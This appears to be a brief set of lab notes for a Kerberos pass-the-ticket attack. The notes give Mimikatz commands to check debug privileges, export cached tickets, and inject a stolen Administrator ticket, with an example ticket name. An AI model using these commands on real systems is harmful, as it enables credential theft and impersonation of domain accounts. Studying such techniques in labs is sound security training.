### check privs
`privilege::debug`
Output '20' means you have admin privs

---

### export .kirbi tickets into current dir
`sekurlsa::tickets /export`

try looking for admin ticket from krbtgt

---

### pass the ticket
`kerberos::ptt <ticket>` 
will cache and impersonate given ticket

example: 
```
kerberos::ptt [0;2a7822]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```

you will now have the ticket in your cache. you can verify in cmd using `klist`



